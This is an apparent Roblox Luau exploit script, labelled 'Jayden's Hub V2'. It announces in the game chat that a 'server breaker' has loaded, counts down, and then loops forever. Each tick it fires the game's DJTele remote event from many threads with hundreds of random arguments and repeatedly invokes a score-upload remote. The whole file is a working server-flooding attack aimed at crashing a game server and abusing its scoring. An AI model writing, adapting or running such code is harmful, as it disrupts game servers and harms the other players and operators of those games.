local Chatevent;

if (game.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and game.ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")) then
	Chatevent = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest;
else
	Chatevent = {};

	function Chatevent:FireServer(message: string, channel: string)
		warn("[Jayden's Hub V2]: Couldn't send " .. message .. " to " .. channel .. " because the remote event doesn't exist.");
	end
end

if (game.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")) then
	Chatevent:FireServer("⚠️ WARNING: FE SERVER BREAKER HAS BEEN LOADED, YOU WILL SPAWN AS NOOBS IN 5 SECONDS (SCRIPT BY JXYSERR)", "All");
	
	task.wait(3);
	
	for i = 5,1,-1 do
		Chatevent:FireServer(("⚠️ WARNING: THE SERVER WILL BREAK IN %s SECONDS! SCRIPT MADE BY JXYSERR"):format(i), "All");
		task.wait(1.2)
	end
	
	Chatevent:FireServer(("⚠️ WARNING: THE SERVER IS NOW BEING JAIL BROKEN! SCRIPT BY JXYSERR!"), "All");
end

while true do
	for i = 1, 18 do
		task.spawn(function()
			game.Workspace.DJTele:FireServer(math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000), math.random(1, 100000));
		end);
	end

	task.spawn(function()
		pcall(function()
			game.Workspace.RemoteScore.UploadScore:InvokeServer();
		end);
	end);

	task.wait();
end
